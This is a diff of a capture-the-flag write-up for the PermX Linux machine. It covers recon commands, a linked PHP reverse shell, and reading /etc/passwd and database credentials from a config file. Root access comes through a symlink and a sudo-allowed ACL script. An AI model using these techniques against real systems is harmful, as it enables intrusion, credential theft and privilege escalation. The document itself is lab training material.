@@ -11,8 +11,7 @@ In this write-up, We’ll go through an easy Linux machine where we first gain i
 
 # Reconnaissance
 
-1. After Starting the machine, I set my target IP as $target environment variable and ran nmap command.
-
+1. After Starting the machine, I set my target IP as $target environment variable and ran nmap command.<br>
 
 _Command — Port Scan: Nmap_
 
@@ -20,11 +19,9 @@ _Command — Port Scan: Nmap_
 nmap $target --top-ports=1000 -sV -v -sC  -Pn > nmap.out
 ```
 
-
 2. Then, As usual I added the host:permx.htb in /etc/hosts.
 
-3. While enumerating the website, I started directory fuzzing and subdomain fuzzing in the background.
-
+3. While enumerating the website, I started directory fuzzing and subdomain fuzzing in the background.<br>
 
 _Command — Subdomain Fuzzing: Fuff_
 
@@ -32,13 +29,11 @@ _Command — Subdomain Fuzzing: Fuff_
 ffuf -w /home/mrrobot/Downloads/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb/ -H "Host:FUZZ.permx.htb" -v -fw 18
 ```
 
-
 _Command — Directory Fuzzing: Gobuster_
 
 ```
 gobuster dir -u http://permx.htb -w /home/mrrobot/Downloads/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 ```
-
 
 4. Let’s Explore the Subdomain: lms.permx.htb which seems interesting.
 
@@ -68,7 +63,6 @@ PHP Reverse Shell: [PHP Reverse Shell](https://raw.githubusercontent.com/pentest
 
 ### Reverse Shell Listener:
 
-
 _Command — Spawn Bash shell: python one-liner_
 
 ```
@@ -83,8 +77,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ## i. User Flag
 
-1. After checking what files are available in the system. I thought of finding files which are owned by ’www-data’
-
+1. After checking what files are available in the system. I thought of finding files which are owned by ’www-data’<br>
 
 _Command — Files owned by a user: find_
 
@@ -92,11 +85,9 @@ _Command — Files owned by a user: find_
 find / -user www-data 2>/dev/null | grep -v '/proc\|/run\|/var/www'
 ```
 
-
 2. I tried running linpeas, but nothing interesting turned out. But I found an interesting file ‘configuration.php’.
 
-3. So I ran a find command to check for any other ‘configuration.php’ file in chamilo application.
-
+3. So I ran a find command to check for any other ‘configuration.php’ file in chamilo application.<br>
 
 _Command — Finding config file: find_
 
@@ -104,11 +95,9 @@ _Command — Finding config file: find_
 find / -name configuation.php 2>/dev/null
 ```
 
+4. Upon opening the file ‘/var/www/chamilo/app/config/configuration.php’, I found the ‘database connection settings’
 
-4. Upon opening the file ‘/var/www/chamilo/app/config/configuration.php’, I found the ‘database connection settings’![[Pasted image 20240912180357.png]]
-
-5. There are two users in this system. We can find this using the following command:
-
+5. There are two users in this system. We can find this using the following command:<br>
 
 _Command — Finding users: /etc/passwd_
 
@@ -116,20 +105,17 @@ _Command — Finding users: /etc/passwd_
 cat /etc/passwd | grep
 ```
 
-
 6. Let’s try ssh using the password from the configuration file.
 
 ## ii. Root Flag
 
-1. Now, We have a low privileged user access. First run the usual command to find the sudo privileged files.
-
+1. Now, We have a low privileged user access. First run the usual command to find the sudo privileged files.<br>
 
 _Command — Sudo Privileged files: sudo_
 
 ```
 sudo -l
 ```
-
 
 2. Let’s read the contents of the file ‘/opt/acl.sh’.
 
@@ -145,25 +131,21 @@ The script gets three arguments: user, permission, target file.<br><br>
 We can use this script to modify permissions of any file which is in the home directory of user ‘mtz’.<br><br>
 If we able to link any important to a file in the home directory of mtz, we can change the permission using the /opt/acl.sh script.<br>
 
-
 _Command — Symbolic link: ln_
 
 ```
 ln -s /etc/passwd /home/mtz/passwd1
 ```
 
-
 4. This command creates a symbolic link of the ‘/etc/passwd’ file to a file ‘/home/mtz/passwd1’.
 
-5. Since this symbolic file is in the home directory of the user ‘mtz’, we can change the permission of the file using the available script ‘/opt/acl.sh’.
-
+5. Since this symbolic file is in the home directory of the user ‘mtz’, we can change the permission of the file using the available script ‘/opt/acl.sh’.<br>
 
 _Command — Using the script: /opt/ach.sh_
 
 ```
 sudo /opt/acl.sh mtz rwx /home/mtz/passwd1
 ```
-
 
 6. This command changes the permission of the symbolic file /home/mtz/passwd1.
 
